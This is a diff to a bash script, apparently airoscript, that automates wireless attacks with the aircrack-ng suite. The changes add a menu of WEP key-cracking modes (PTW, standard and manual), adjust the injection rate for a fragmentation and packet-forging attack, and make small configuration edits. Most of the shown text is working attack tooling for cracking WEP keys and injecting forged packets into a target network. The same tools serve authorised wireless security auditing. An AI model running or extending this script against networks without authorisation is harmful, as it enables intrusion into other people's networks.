@@ -22,6 +22,7 @@
 
 #CardCtl executable (on 2.4 kernels, it is cardctl)
 CARDCTL="pccardctl"
+DHCPSOFT="dhcpcd"
 #
 WELCOME="0"
 DEBUG="0"
@@ -576,14 +577,14 @@ function configure {
 		iwconfig $WIFI essid "$Host_SSID"
 		echo "Setting: iwconfig $WIFI key $KEY"
 		iwconfig $WIFI key restricted $KEY
-		echo "Setting: dhcpcd $WIFI"
+		echo "Setting: $DHCPSOFT $WIFI"
 		sleep 1
 		iwconfig $WIFI rate auto
 		iwconfig $WIFI ap any
 		sleep 3
 		iwconfig $WIFI ap any rate auto mode Managed channel $Host_CHAN essid "$Host_SSID" key restricted $KEY
 		sleep 3
-		dhcpcd $WIFI
+		$DHCPSOFT $WIFI
 		echo "Will now ping google.com"
 		ping www.google.com
 }
@@ -603,14 +604,14 @@ function wpaconfigure {
 		iwconfig $WIFI essid "$Host_SSID"
 		echo "Setting: iwconfig $WIFI key $KEY"
 		iwconfig $WIFI key restricted $KEY
-		echo "Setting: dhcpcd $WIFI"
+		echo "Setting: $DHCPSOFT $WIFI"
 		sleep 1
 		iwconfig $WIFI rate auto
 		iwconfig $WIFI ap any
 		sleep 3
 		iwconfig $WIFI ap any rate auto mode Managed channel $Host_CHAN essid "$Host_SSID" key restricted $KEY
 		sleep 3
-		dhcpcd $WIFI
+		$DHCPSOFT $WIFI
 		echo "Will now ping google.com"
 		ping www.google.com
 }
@@ -831,8 +832,44 @@ if [ $Host_ENC = "WEP" ]
 		fi			
 }
 # aircrack command 
-function crack   {
-	xterm $HOLD $TOPRIGHT -title "Aircracking: $Host_SSID" -hold -e $AIRCRACK -a 1 -b $Host_MAC -f $FUDGEFACTOR -0 -z -s $DUMP_PATH/$Host_MAC-01.cap & menufonction
+function crackptw   {
+	x-terminal-emulator $HOLD -title "Aircracking-PTW: $Host_SSID" $TOPRIGHT --notabbar --nomenubar --noclose -e $AIRCRACK -z -b $Host_MAC -f $FUDGEFACTOR -0 -s $DUMP_PATH/$Host_MAC-01.cap & menufonction
+}
+function crackstd   {
+	x-terminal-emulator $HOLD -title "Aircracking: $Host_SSID" $TOPRIGHT --notabbar --nomenubar --noclose -e $AIRCRACK -a 1 -b $Host_MAC -f $FUDGEFACTOR -0 -s $DUMP_PATH/$Host_MAC-01.cap & menufonction
+}
+function crackman {
+echo -n "type fudge factor"
+read FUDGE_FACTOR
+echo You typed: $FUDGE_FACTOR
+set -- ${FUDGE_FACTOR}
+echo -n "type encryption size 64,128 etc..."
+read ENC_SIZE
+echo You typed: $ENC_SIZE
+set -- ${ENC_SIZE}
+
+	x-terminal-emulator $HOLD -title "Manual cracking: $Host_SSID" $TOPRIGHT --notabbar --nomenubar --noclose -e $AIRCRACK -a 1 -b $Host_MAC -f $FUDGE_FACTOR -n $ENC_SIZE -0 -s $DUMP_PATH/$Host_MAC-01.cap & menufonction
+
+}
+function crack {
+while true; do
+
+  echo "#######################################"
+  echo "###      WEP CRACKING OPTIONS       ###"
+  echo "###                                 ###"
+  echo "###   1) aircrack-ng PTW attack     ###"
+  echo "###   2) aircrack-ng standard       ###"
+  echo "###   3) aircrack-ng user options   ###"
+  echo "###                                 ###"
+  echo "#######################################"
+  read yn
+  case $yn in
+    1 ) crackptw ; break ;;
+    2 ) crackstd ; break ;;
+    3 ) crackman ; break ;;
+    * ) echo "unknown response. Try again" ;;
+  esac
+done 
 }
 # WPA attack function
 function wpahandshake {
@@ -963,12 +1000,12 @@ rm -rf fragment-*
 rm -rf $DUMP_PATH/frag_*
 rm -rf $DUMP_PATH/$Host_MAC*
 killall -9 airodump-ng aireplay-ng
-iwconfig $WIFI rate 1M channel $Host_CHAN mode monitor
+iwconfig $WIFI rate 2M channel $Host_CHAN mode monitor
 xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Fragmentation attack on $Host_SSID" -e $AIREPLAY -5 -b $Host_MAC -h $Client_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $WIFI & capture &  menufonction
 }
 
 function fragmentationattackend {
-iwconfig $WIFI rate 1M
+iwconfig $WIFI rate 2M
 $ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
 capture & xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Injecting forged packet on $Host_SSID" -e $AIREPLAY -2 -r $DUMP_PATH/frag_$Host_MAC.cap -x $INJECTRATE $WIFI & menufonction
 }
@@ -1018,6 +1055,7 @@ fi
 # Main Section this is the "menu" part, where all the functions are called		
 #
 #
+	modprobe rtc
 	clear
 	checkdir
 	greetings
@@ -1050,11 +1088,11 @@ select choix in $CHOICES; do
 	menu
 	fi					
 	elif [ "$choix" = "3" ]; then
-	$AIRMON start $WIFI $Host_CHAN
+#	$AIRMON start $WIFI $Host_CHAN
 #	iwconfig $WIFI rate $Host_SPEED"M"
-	iwconfig $WIFI rate 1M
+#	iwconfig $WIFI rate 1M
 #	echo "iwconfig $WIFI rate $Host_SPEED"M""
-	echo "iwconfig $WIFI rate 1"M""
+#	echo "iwconfig $WIFI rate 1"M""
 	witchattack	
 	clear
 	target
